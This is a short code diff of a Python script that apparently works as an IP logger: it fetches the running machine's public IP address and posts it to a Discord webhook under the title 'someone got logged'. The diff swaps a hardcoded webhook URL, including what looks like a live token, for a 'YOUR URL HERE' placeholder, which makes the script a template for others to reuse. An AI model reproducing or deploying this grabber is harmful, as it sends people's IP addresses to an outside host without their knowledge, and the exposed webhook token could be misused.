@@ -6,7 +6,7 @@ import discord_webhook
 from discord_webhook import DiscordWebhook, DiscordEmbed
 ip = 'https://api.ipify.org/' 
 output = requests.get(ip).text
-webhook = DiscordWebhook(url='https://discord.com/api/webhooks/886182802066931712/s8lV0jnnCZWNq_wayjw8-stACWkpaRGSqkFiYM6Js-8T1gz7xiQoull6YVpiEl0VO-JO')
+webhook = DiscordWebhook(url='YOUR URL HERE')
 embed = DiscordEmbed(title='someone got logged', description=output, color=65280)
 embed.set_timestamp()
 webhook.add_embed(embed)
